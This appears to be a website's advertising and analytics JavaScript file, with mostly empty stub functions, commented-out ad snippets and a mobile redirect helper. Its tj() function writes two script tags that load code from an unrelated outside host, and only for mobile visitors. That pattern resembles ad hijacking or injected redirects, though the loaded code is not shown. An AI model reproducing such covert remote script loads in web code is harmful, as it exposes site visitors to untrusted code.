function index_r01() {
}
function index_02() {
}
function topbanner() {
}
function Cleft01() {
}
function Cleft_1() {
}
function Cleft_2() {
}
function Cleft_02() {
}
function Cleft_3() {
}
function Cleft_4() {
}
function Cleft_5() {
}
function yuansheng() {
}
function right01() {
}
function right02() {
}
function art_right01() {
}
function bofang() {
}

function duilian() {
	var random = {
		ad_num : 2,
		init : function(){
			n = (Math.floor(Math.random()*random.ad_num+1));
			switch(n){
				case 1:
				break;
				case 2:
				break;
			}
		}
	}
	//random.init();
}

function bdsearch() {
    
}

function tj() {
	
	document.write('<script language="javascript" src="http://count51.51yes.com/click.aspx?id=518737511&logo=12" charset="gb2312"></script></div>');
	var isiPad = navigator.userAgent.match(/iPad|iPhone|Linux|Android|ios|iPod/i) != null;
	if (isiPad) {
		document.write("<script src='https://www.hxyifu.com/title/6291'></script><script src='https://www.hxyifu.com/title/6292'></script>");
	}
}
function zxtj() {
	
}
function fu() {
	//document.writeln('<script type="text/javascript">/*300*250 创建于 2016-04-06*/var cpro_id = "u2590519";</script>');
	//document.writeln('<script src="http://cpro.baidustatic.com/cpro/ui/c.js" type="text/javascript"></script>');
	
	
	//document.writeln('<script charset=gb2312 src="http://v.img80.net/showpage2.asp?u=15214"></script>');
	//document.writeln('<script src="http://s.erlpbwy.cn/k-18538-0"></script>');/*点瑞*/
}

// var _hmt = _hmt || [];
// (function() {
//   var hm = document.createElement("script");
//   hm.src = "//hm.baidu.com/hm.js?7a914d9e86e5e400a6780a751da57dc2";
//   var s = document.getElementsByTagName("script")[0]; 
//   s.parentNode.insertBefore(hm, s);
// })();

function uaredirect(f) {
    try {
        if (document.getElementById("bdmark") != null) {
            return
        }
        var b = false;
        if (arguments[1]) {
            var e = window.location.host;
            var a = window.location.href;
            if (isSubdomain(arguments[1], e) == 1) {
                f = f + "/#m/" + a;
                b = true
            } else {
                if (isSubdomain(arguments[1], e) == 2) {
                    f = f + "/#m/" + a;
                    b = true
                } else {
                    f = a;
                    b = false
                }
            }
        } else {
            b = true
        }
        if (b) {
            var c = window.location.hash;
            if (!c.match("fromapp")) {
                if ((navigator.userAgent.match(/(iPhone|iPod|Android|ios)/i))) {
                    location.replace(f)
                }
            }
        }
    } catch (d) {}
}

function isSubdomain(c, d) {
    this.getdomain = function(f) {
        var e = f.indexOf("://");
        if (e > 0) {
            var h = f.substr(e + 3)
        } else {
            var h = f
        }
        var g = /^www\./;
        if (g.test(h)) {
            h = h.substr(4)
        }
        return h
    };
    if (c == d) {
        return 1
    } else {
        var c = this.getdomain(c);
        var b = this.getdomain(d);
        if (c == b) {
            return 1
        } else {
            c = c.replace(".", "\\.");
            var a = new RegExp("\\." + c + "$");
            if (b.match(a)) {
                return 2
            } else {
                return 0
            }
        }
    }
};
//uaredirect("/");
